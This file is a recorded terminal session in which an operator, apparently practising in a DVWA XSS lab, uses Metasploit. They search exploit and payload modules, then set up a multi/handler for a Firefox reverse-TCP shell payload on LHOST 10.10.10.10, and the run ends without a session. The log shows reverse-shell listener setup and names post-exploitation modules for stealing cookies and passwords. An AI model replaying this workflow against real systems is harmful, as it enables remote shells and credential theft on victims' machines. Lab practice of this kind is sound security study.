@@ -1,0 +1,1928 @@
+Script started on 2020-08-31 16:25:37+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ sudo st[K[Kmsfd
+msfd   msfdb  
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ sudo msfdb start
+[sudo] password for dinesh: 
+[01;32m[+][00m Starting database
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ msfconsole -w[Kq
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> search javascript
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss  2015-04-08       normal     No     Arris / Motorola Surfboard SBG6580 Web Interface Takeover
+   1   auxiliary/gather/android_stock_browser_uxss                                  normal     No     Android Open Source Platform (AOSP) Browser UXSS
+   2   auxiliary/gather/apple_safari_webarchive_uxss               2013-02-22       normal     No     Mac OS X Safari .webarchive File Format UXSS
+   3   auxiliary/gather/c2s_dvr_password_disclosure                2016-08-19       normal     No     C2S DVR Management Password Disclosure
+   4   auxiliary/gather/firefox_pdfjs_file_theft                                    normal     No     Firefox PDF.js Browser File Theft
+   5   auxiliary/gather/ie_uxss_injection                          2015-02-01       normal     No     MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain [45mJavaScript[0m Injection
+   6   auxiliary/gather/ipcamera_password_disclosure               2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
+   7   auxiliary/gather/mongodb_js_inject_collection_enum          2014-06-07       normal     No     MongoDB NoSQL Collection Enumeration Via Injection
+   8   auxiliary/gather/safari_file_url_navigation                 2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
+   9   auxiliary/server/capture/http_[45mjavascript[0m_keylogger                           normal     No     Capture: HTTP [45mJavaScript[0m Keylogger
+   10  exploit/android/browser/webview_add[45mjavascript[0minterface      2012-12-21       [32mexcellent[0m  No     Android Browser and WebView add[45mJavascript[0mInterface Code Execution
+   11  exploit/android/fileformat/adobe_reader_pdf_js_interface    2014-04-13       good       No     Adobe Reader for Android add[45mJavascript[0mInterface Exploit
+   12  exploit/apple_ios/browser/webkit_createthis                 2018-03-15       manual     No     Safari Webkit Proxy Object Type Confusion
+   13  exploit/apple_ios/browser/webkit_trident                    2016-08-25       manual     No     WebKit not_number defineProperties UAF
+   14  exploit/firefox/local/exec_shellcode                        2014-03-10       [32mexcellent[0m  No     Firefox Exec Shellcode from Privileged [45mJavascript[0m Shell
+   15  exploit/multi/browser/firefox_escape_retval                 2009-07-13       normal     No     Firefox 3.5 escape() Return Value Memory Corruption
+   16  exploit/multi/browser/firefox_pdfjs_privilege_escalation    2015-03-31       manual     No     Firefox PDF.js Privileged [45mJavascript[0m Injection
+   17  exploit/multi/browser/firefox_proto_crmfrequest             2013-08-06       [32mexcellent[0m  No     Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution
+   18  exploit/multi/browser/firefox_proxy_prototype               2014-01-20       manual     No     Firefox Proxy Prototype Privileged [45mJavascript[0m Injection
+   19  exploit/multi/browser/firefox_svg_plugin                    2013-01-08       [32mexcellent[0m  No     Firefox 17.0.1 Flash Privileged Code Injection
+   20  exploit/multi/browser/firefox_tostring_console_injection    2013-05-14       [32mexcellent[0m  No     Firefox toString console.time Privileged [45mJavascript[0m Injection
+   21  exploit/multi/browser/firefox_webidl_injection              2014-03-17       [32mexcellent[0m  No     Firefox WebIDL Privileged [45mJavascript[0m Injection
+   22  exploit/multi/browser/firefox_xpi_bootstrapped_addon        2007-06-27       [32mexcellent[0m  No     Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
+   23  exploit/multi/browser/msfd_rce_browser                      2018-04-11       normal     No     Metasploit msfd Remote Code Execution via Browser
+   24  exploit/multi/fileformat/js_unpacker_eval_injection         2015-02-18       [32mexcellent[0m  No     [45mJavascript[0m Injection for Eval-based Unpackers
+   25  exploit/multi/fileformat/nodejs_js_yaml_load_code_exec      2013-06-28       [32mexcellent[0m  No     Nodejs js-yaml load() Code Execution
+   26  exploit/multi/http/bassmaster_js_injection                  2016-11-01       [32mexcellent[0m  Yes    Bassmaster Batch Arbitrary [45mJavaScript[0m Injection Remote Code Execution
+   27  exploit/multi/http/totaljs_cms_widget_exec                  2019-08-30       [32mexcellent[0m  Yes    Total.js CMS 12 Widget [45mJavaScript[0m Code Injection
+   28  exploit/osx/browser/safari_proxy_object_type_confusion      2018-03-15       manual     No     Safari Proxy Object Type Confusion
+   29  exploit/osx/browser/software_update                         2007-12-17       [32mexcellent[0m  No     Apple OS X Software Update Command Execution
+   30  exploit/windows/browser/adobe_jbig2decode                   2009-02-19       good       No     Adobe JBIG2Decode Heap Corruption
+   31  exploit/windows/browser/chrome_filereader_uaf               2019-03-21       manual     No     Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86
+   32  exploit/windows/browser/ie_unsafe_scripting                 2010-09-20       manual     No     Microsoft Internet Explorer Unsafe Scripting Misconfiguration
+   33  exploit/windows/browser/ms05_054_onload                     2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer [45mJavaScript[0m OnLoad Handler Remote Code Execution
+   34  exploit/windows/browser/ms11_081_option                     2012-10-11       normal     No     MS11-081 Microsoft Internet Explorer Option Element Use-After-Free
+   35  exploit/windows/browser/ms12_037_ie_colspan                 2012-06-12       normal     No     MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow
+   36  exploit/windows/fileformat/adobe_jbig2decode                2009-02-19       good       No     Adobe JBIG2Decode Memory Corruption
+   37  exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs      2010-03-29       [32mexcellent[0m  No     Adobe PDF Escape EXE Social Engineering (No [45mJavaScript[0m)
+   38  exploit/windows/fileformat/adobe_reader_u3d                 2011-12-06       average    No     Adobe Reader U3D Memory Corruption Vulnerability
+   39  exploit/windows/fileformat/foxit_reader_filewrite           2011-03-05       normal     No     Foxit PDF Reader 4.2 [45mJavascript[0m File Write
+   40  exploit/windows/fileformat/foxit_title_bof                  2010-11-13       [32mgreat[0m      No     Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
+   41  exploit/windows/fileformat/nitro_reader_jsapi               2017-07-24       [32mexcellent[0m  No     Nitro Pro PDF Reader 11.0.3.173 [45mJavascript[0m API Remote Code Execution
+   42  exploit/windows/fileformat/nuance_pdf_launch_overflow       2010-10-08       [32mgreat[0m      No     Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
+   43  payload/firefox/shell_bind_tcp                                               normal     No     Command Shell, Bind TCP (via Firefox XPCOM script)
+   44  payload/firefox/shell_reverse_tcp                                            normal     No     Command Shell, Reverse TCP (via Firefox XPCOM script)
+   45  post/firefox/gather/cookies                                 2014-03-26       normal     No     Firefox Gather Cookies from Privileged [45mJavascript[0m Shell
+   46  post/firefox/gather/history                                 2014-04-11       normal     No     Firefox Gather History from Privileged [45mJavascript[0m Shell
+   47  post/firefox/gather/passwords                               2014-04-11       normal     No     Firefox Gather Passwords from Privileged [45mJavascript[0m Shell
+   48  post/firefox/gather/xss                                                      normal     No     Firefox XSS
+   49  post/firefox/manage/webcam_chat                             2014-05-13       normal     No     Firefox Webcam Chat on Privileged [45mJavascript[0m Shell
+
+
+[4mmsf5[0m [0m> use exploit/firefox/local/exec_shellcode[P[P[P exploit/firefox/local/exec_shellcodei exploit/firefox/local/exec_shellcoden exploit/firefox/local/exec_shellcodef exploit/firefox/local/exec_shellcodeo exploit/firefox/local/exec_shellcode
+[0m
+       Name: Firefox Exec Shellcode from Privileged Javascript Shell
+     Module: exploit/firefox/local/exec_shellcode
+   Platform: Firefox
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2014-03-10
+
+Provided by:
+  joev <joev@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Native Payload
+
+Check supported:
+  No
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION                   yes       The session to run this module on.
+  TIMEOUT  90               yes       Maximum time (seconds) to wait for a response
+
+Payload information:
+
+Description:
+  This module allows execution of native payloads from a privileged 
+  Firefox Javascript shell. It places the specified payload into 
+  memory, adds the necessary protection flags, and calls it, which can 
+  be useful for upgrading a Firefox javascript shell to a Meterpreter 
+  session without touching the disk.
+
+[4mmsf5[0m [0m> q[Kinfo exploit/firefox/local/exec_shellcode[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch javascript
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss  2015-04-08       normal     No     Arris / Motorola Surfboard SBG6580 Web Interface Takeover
+   1   auxiliary/gather/android_stock_browser_uxss                                  normal     No     Android Open Source Platform (AOSP) Browser UXSS
+   2   auxiliary/gather/apple_safari_webarchive_uxss               2013-02-22       normal     No     Mac OS X Safari .webarchive File Format UXSS
+   3   auxiliary/gather/c2s_dvr_password_disclosure                2016-08-19       normal     No     C2S DVR Management Password Disclosure
+   4   auxiliary/gather/firefox_pdfjs_file_theft                                    normal     No     Firefox PDF.js Browser File Theft
+   5   auxiliary/gather/ie_uxss_injection                          2015-02-01       normal     No     MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain [45mJavaScript[0m Injection
+   6   auxiliary/gather/ipcamera_password_disclosure               2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
+   7   auxiliary/gather/mongodb_js_inject_collection_enum          2014-06-07       normal     No     MongoDB NoSQL Collection Enumeration Via Injection
+   8   auxiliary/gather/safari_file_url_navigation                 2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
+   9   auxiliary/server/capture/http_[45mjavascript[0m_keylogger                           normal     No     Capture: HTTP [45mJavaScript[0m Keylogger
+   10  exploit/android/browser/webview_add[45mjavascript[0minterface      2012-12-21       [32mexcellent[0m  No     Android Browser and WebView add[45mJavascript[0mInterface Code Execution
+   11  exploit/android/fileformat/adobe_reader_pdf_js_interface    2014-04-13       good       No     Adobe Reader for Android add[45mJavascript[0mInterface Exploit
+   12  exploit/apple_ios/browser/webkit_createthis                 2018-03-15       manual     No     Safari Webkit Proxy Object Type Confusion
+   13  exploit/apple_ios/browser/webkit_trident                    2016-08-25       manual     No     WebKit not_number defineProperties UAF
+   14  exploit/firefox/local/exec_shellcode                        2014-03-10       [32mexcellent[0m  No     Firefox Exec Shellcode from Privileged [45mJavascript[0m Shell
+   15  exploit/multi/browser/firefox_escape_retval                 2009-07-13       normal     No     Firefox 3.5 escape() Return Value Memory Corruption
+   16  exploit/multi/browser/firefox_pdfjs_privilege_escalation    2015-03-31       manual     No     Firefox PDF.js Privileged [45mJavascript[0m Injection
+   17  exploit/multi/browser/firefox_proto_crmfrequest             2013-08-06       [32mexcellent[0m  No     Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution
+   18  exploit/multi/browser/firefox_proxy_prototype               2014-01-20       manual     No     Firefox Proxy Prototype Privileged [45mJavascript[0m Injection
+   19  exploit/multi/browser/firefox_svg_plugin                    2013-01-08       [32mexcellent[0m  No     Firefox 17.0.1 Flash Privileged Code Injection
+   20  exploit/multi/browser/firefox_tostring_console_injection    2013-05-14       [32mexcellent[0m  No     Firefox toString console.time Privileged [45mJavascript[0m Injection
+   21  exploit/multi/browser/firefox_webidl_injection              2014-03-17       [32mexcellent[0m  No     Firefox WebIDL Privileged [45mJavascript[0m Injection
+   22  exploit/multi/browser/firefox_xpi_bootstrapped_addon        2007-06-27       [32mexcellent[0m  No     Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
+   23  exploit/multi/browser/msfd_rce_browser                      2018-04-11       normal     No     Metasploit msfd Remote Code Execution via Browser
+   24  exploit/multi/fileformat/js_unpacker_eval_injection         2015-02-18       [32mexcellent[0m  No     [45mJavascript[0m Injection for Eval-based Unpackers
+   25  exploit/multi/fileformat/nodejs_js_yaml_load_code_exec      2013-06-28       [32mexcellent[0m  No     Nodejs js-yaml load() Code Execution
+   26  exploit/multi/http/bassmaster_js_injection                  2016-11-01       [32mexcellent[0m  Yes    Bassmaster Batch Arbitrary [45mJavaScript[0m Injection Remote Code Execution
+   27  exploit/multi/http/totaljs_cms_widget_exec                  2019-08-30       [32mexcellent[0m  Yes    Total.js CMS 12 Widget [45mJavaScript[0m Code Injection
+   28  exploit/osx/browser/safari_proxy_object_type_confusion      2018-03-15       manual     No     Safari Proxy Object Type Confusion
+   29  exploit/osx/browser/software_update                         2007-12-17       [32mexcellent[0m  No     Apple OS X Software Update Command Execution
+   30  exploit/windows/browser/adobe_jbig2decode                   2009-02-19       good       No     Adobe JBIG2Decode Heap Corruption
+   31  exploit/windows/browser/chrome_filereader_uaf               2019-03-21       manual     No     Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86
+   32  exploit/windows/browser/ie_unsafe_scripting                 2010-09-20       manual     No     Microsoft Internet Explorer Unsafe Scripting Misconfiguration
+   33  exploit/windows/browser/ms05_054_onload                     2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer [45mJavaScript[0m OnLoad Handler Remote Code Execution
+   34  exploit/windows/browser/ms11_081_option                     2012-10-11       normal     No     MS11-081 Microsoft Internet Explorer Option Element Use-After-Free
+   35  exploit/windows/browser/ms12_037_ie_colspan                 2012-06-12       normal     No     MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow
+   36  exploit/windows/fileformat/adobe_jbig2decode                2009-02-19       good       No     Adobe JBIG2Decode Memory Corruption
+   37  exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs      2010-03-29       [32mexcellent[0m  No     Adobe PDF Escape EXE Social Engineering (No [45mJavaScript[0m)
+   38  exploit/windows/fileformat/adobe_reader_u3d                 2011-12-06       average    No     Adobe Reader U3D Memory Corruption Vulnerability
+   39  exploit/windows/fileformat/foxit_reader_filewrite           2011-03-05       normal     No     Foxit PDF Reader 4.2 [45mJavascript[0m File Write
+   40  exploit/windows/fileformat/foxit_title_bof                  2010-11-13       [32mgreat[0m      No     Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
+   41  exploit/windows/fileformat/nitro_reader_jsapi               2017-07-24       [32mexcellent[0m  No     Nitro Pro PDF Reader 11.0.3.173 [45mJavascript[0m API Remote Code Execution
+   42  exploit/windows/fileformat/nuance_pdf_launch_overflow       2010-10-08       [32mgreat[0m      No     Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
+   43  payload/firefox/shell_bind_tcp                                               normal     No     Command Shell, Bind TCP (via Firefox XPCOM script)
+   44  payload/firefox/shell_reverse_tcp                                            normal     No     Command Shell, Reverse TCP (via Firefox XPCOM script)
+   45  post/firefox/gather/cookies                                 2014-03-26       normal     No     Firefox Gather Cookies from Privileged [45mJavascript[0m Shell
+   46  post/firefox/gather/history                                 2014-04-11       normal     No     Firefox Gather History from Privileged [45mJavascript[0m Shell
+   47  post/firefox/gather/passwords                               2014-04-11       normal     No     Firefox Gather Passwords from Privileged [45mJavascript[0m Shell
+   48  post/firefox/gather/xss                                                      normal     No     Firefox XSS
+   49  post/firefox/manage/webcam_chat                             2014-05-13       normal     No     Firefox Webcam Chat on Privileged [45mJavascript[0m Shell
+
+
+[4mmsf5[0m [0m> info payload/firefox/shell_reverse_tcp
+[0m
+       Name: Command Shell, Reverse TCP (via Firefox XPCOM script)
+     Module: payload/firefox/shell_reverse_tcp
+   Platform: Firefox
+       Arch: firefox
+Needs Admin: No
+ Total size: 7374
+       Rank: Normal
+
+Provided by:
+  joev <joev@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Creates an interactive shell via Javascript with access to Firefox's 
+  XPCOM API
+
+
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use [K[K[K[Kinfo mul[K[K[Kexploit/multi/browser/
+info exploit/multi/browser/adobe_flash_hacking_team_uaf
+info exploit/multi/browser/adobe_flash_nellymoser_bof
+info exploit/multi/browser/adobe_flash_net_connection_confusion
+info exploit/multi/browser/adobe_flash_opaque_background_uaf
+info exploit/multi/browser/adobe_flash_pixel_bender_bof
+info exploit/multi/browser/adobe_flash_shader_drawing_fill
+info exploit/multi/browser/adobe_flash_shader_job_overflow
+info exploit/multi/browser/adobe_flash_uncompress_zlib_uaf
+info exploit/multi/browser/chrome_array_map
+info exploit/multi/browser/chrome_jscreate_sideeffect
+info exploit/multi/browser/chrome_object_create
+info exploit/multi/browser/firefox_escape_retval
+info exploit/multi/browser/firefox_pdfjs_privilege_escalation
+info exploit/multi/browser/firefox_proto_crmfrequest
+info exploit/multi/browser/firefox_proxy_prototype
+info exploit/multi/browser/firefox_queryinterface
+info exploit/multi/browser/firefox_svg_plugin
+info exploit/multi/browser/firefox_tostring_console_injection
+info exploit/multi/browser/firefox_webidl_injection
+info exploit/multi/browser/firefox_xpi_bootstrapped_addon
+info exploit/multi/browser/itms_overflow
+info exploit/multi/browser/java_atomicreferencearray
+info exploit/multi/browser/java_calendar_deserialize
+info exploit/multi/browser/java_getsoundbank_bof
+info exploit/multi/browser/java_jre17_driver_manager
+info exploit/multi/browser/java_jre17_exec
+info exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl
+info exploit/multi/browser/java_jre17_jaxws
+info exploit/multi/browser/java_jre17_jmxbean
+info exploit/multi/browser/java_jre17_jmxbean_2
+info exploit/multi/browser/java_jre17_method_handle
+info exploit/multi/browser/java_jre17_provider_skeleton
+info exploit/multi/browser/java_jre17_reflection_types
+--More--[Kinfo exploit/multi/browser/java_rhino
+info exploit/multi/browser/java_rmi_connection_impl
+info exploit/multi/browser/java_setdifficm_bof
+info exploit/multi/browser/java_signed_applet
+info exploit/multi/browser/java_storeimagearray
+info exploit/multi/browser/java_trusted_chain
+info exploit/multi/browser/java_verifier_field_access
+info exploit/multi/browser/mozilla_compareto
+info exploit/multi/browser/mozilla_navigatorjava
+info exploit/multi/browser/msfd_rce_browser
+info exploit/multi/browser/opera_configoverwrite
+info exploit/multi/browser/opera_historysearch
+info exploit/multi/browser/qtjava_pointer
+[4mmsf5[0m [0m> info exploit/multi/browser/[K[K[K[K[K[K[K[K[K/ha
+info exploit/multi/hams/steamed  info exploit/multi/handler       
+[4mmsf5[0m [0m> info exploit/multi/handler 
+[0m
+       Name: Generic Payload Handler
+     Module: exploit/multi/handler
+   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
+       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Manual
+
+Provided by:
+  hdm <x@hdm.io>
+  bcook-r7
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Wildcard Target
+
+Check supported:
+  No
+
+Payload information:
+  Space: 10000000
+  Avoid: 0 characters
+
+Description:
+  This module is a stub that provides all of the features of the 
+  Metasploit payload system to exploits that have been launched 
+  outside of the framework.
+
+[4mmsf5[0m [0m> info exploit/multi/handler [P[P[P[Pu exploit/multi/handler s exploit/multi/handler e exploit/multi/handler 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> ls[K[Kshh[Kow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set a[Kpayload payload/firefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp
+[0mpayload => firefox/shell_reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> shii[K[Kow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show targets 
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exploit 
+[0m
+[1m[31m[-][0m Exploit failed: An exploitation error occurred.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use e[K[K[K[K[Kseac[Krch dev[Klivery
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/client/smtp/emailer                                                normal     No     Generic Emailer (SMTP)
+   1   auxiliary/server/regsvr32_command_[45mdelivery[0m_server                            normal     No     Regsvr32.exe (.sct) Command [45mDelivery[0m Server
+   2   exploit/linux/http/citrix_dir_traversal_rce                 2019-12-17       [32mexcellent[0m  Yes    Citrix ADC (NetScaler) Directory Traversal RCE
+   3   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   4   exploit/multi/script/web_[45mdelivery[0m                           2013-07-19       manual     No     Script Web [45mDelivery[0m
+   5   exploit/windows/fileformat/irfanview_jpeg2000_bof           2012-01-16       normal     No     Irfanview JPEG2000 jp2 Stack Buffer Overflow
+   6   exploit/windows/fileformat/office_dde_[45mdelivery[0m              2017-10-09       manual     No     Microsoft Office DDE Payload [45mDelivery[0m
+   7   exploit/windows/fileformat/office_excel_slk                 2018-10-07       manual     No     Microsoft Excel .SLK Payload [45mDelivery[0m
+   8   exploit/windows/misc/ais_esel_server_rce                    2019-03-27       [32mexcellent[0m  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   9   exploit/windows/misc/webdav_[45mdelivery[0m                        1999-01-01       manual     No     Serve DLL via webdav server
+   10  exploit/windows/mssql/mssql_payload                         2000-05-30       [32mexcellent[0m  Yes    Microsoft SQL Server Payload Execution
+   11  exploit/windows/mssql/mssql_payload_sqli                    2000-05-30       [32mexcellent[0m  No     Microsoft SQL Server Payload Execution via SQL Injection
+   12  exploit/windows/smb/smb_[45mdelivery[0m                            2016-07-26       [32mexcellent[0m  No     SMB [45mDelivery[0m
+   13  exploit/windows/winrm/winrm_script_exec                     2012-11-01       manual     No     WinRM Script Exec Remote Code Execution
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/multi/[H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/multi/
+Display all 333 possibilities? (y or n)
+use exploit/multi/browser/adobe_flash_hacking_team_uaf
+use exploit/multi/browser/adobe_flash_nellymoser_bof
+use exploit/multi/browser/adobe_flash_net_connection_confusion
+use exploit/multi/browser/adobe_flash_opaque_background_uaf
+use exploit/multi/browser/adobe_flash_pixel_bender_bof
+use exploit/multi/browser/adobe_flash_shader_drawing_fill
+use exploit/multi/browser/adobe_flash_shader_job_overflow
+use exploit/multi/browser/adobe_flash_uncompress_zlib_uaf
+use exploit/multi/browser/chrome_array_map
+use exploit/multi/browser/chrome_jscreate_sideeffect
+use exploit/multi/browser/chrome_object_create
+use exploit/multi/browser/firefox_escape_retval
+use exploit/multi/browser/firefox_pdfjs_privilege_escalation
+use exploit/multi/browser/firefox_proto_crmfrequest
+use exploit/multi/browser/firefox_proxy_prototype
+use exploit/multi/browser/firefox_queryinterface
+use exploit/multi/browser/firefox_svg_plugin
+use exploit/multi/browser/firefox_tostring_console_injection
+use exploit/multi/browser/firefox_webidl_injection
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+use exploit/multi/browser/itms_overflow
+use exploit/multi/browser/java_atomicreferencearray
+use exploit/multi/browser/java_calendar_deserialize
+use exploit/multi/browser/java_getsoundbank_bof
+use exploit/multi/browser/java_jre17_driver_manager
+use exploit/multi/browser/java_jre17_exec
+use exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl
+use exploit/multi/browser/java_jre17_jaxws
+use exploit/multi/browser/java_jre17_jmxbean
+use exploit/multi/browser/java_jre17_jmxbean_2
+use exploit/multi/browser/java_jre17_method_handle
+use exploit/multi/browser/java_jre17_provider_skeleton
+use exploit/multi/browser/java_jre17_reflection_types
+--More--[Kuse exploit/multi/browser/java_rhino
+use exploit/multi/browser/java_rmi_connection_impl
+use exploit/multi/browser/java_setdifficm_bof
+use exploit/multi/browser/java_signed_applet
+use exploit/multi/browser/java_storeimagearray
+use exploit/multi/browser/java_trusted_chain
+use exploit/multi/browser/java_verifier_field_access
+use exploit/multi/browser/mozilla_compareto
+use exploit/multi/browser/mozilla_navigatorjava
+use exploit/multi/browser/msfd_rce_browser
+use exploit/multi/browser/opera_configoverwrite
+use exploit/multi/browser/opera_historysearch
+use exploit/multi/browser/qtjava_pointer
+use exploit/multi/elasticsearch/script_mvel_rce
+use exploit/multi/elasticsearch/search_groovy_script
+use exploit/multi/fileformat/adobe_u3d_meshcont
+use exploit/multi/fileformat/evince_cbt_cmd_injection
+use exploit/multi/fileformat/ghostscript_failed_restore
+use exploit/multi/fileformat/js_unpacker_eval_injection
+use exploit/multi/fileformat/libreoffice_logo_exec
+use exploit/multi/fileformat/libreoffice_macro_exec
+use exploit/multi/fileformat/maple_maplet
+use exploit/multi/fileformat/nodejs_js_yaml_load_code_exec
+use exploit/multi/fileformat/office_word_macro
+use exploit/multi/fileformat/peazip_command_injection
+use exploit/multi/fileformat/swagger_param_inject
+use exploit/multi/fileformat/zip_slip
+use exploit/multi/ftp/pureftpd_bash_env_exec
+use exploit/multi/ftp/wuftpd_site_exec_format
+use exploit/multi/gdb/gdb_server_exec
+use exploit/multi/hams/steamed
+use exploit/multi/handler
+use exploit/multi/http/activecollab_chat
+--More--[Kuse exploit/multi/http/ajaxplorer_checkinstall_exec
+use exploit/multi/http/apache_activemq_upload_jsp
+use exploit/multi/http/apache_jetspeed_file_upload
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+use exploit/multi/http/apache_roller_ognl_injection
+use exploit/multi/http/apprain_upload_exec
+use exploit/multi/http/atutor_sqli
+use exploit/multi/http/auxilium_upload_exec
+use exploit/multi/http/axis2_deployer
+use exploit/multi/http/bassmaster_js_injection
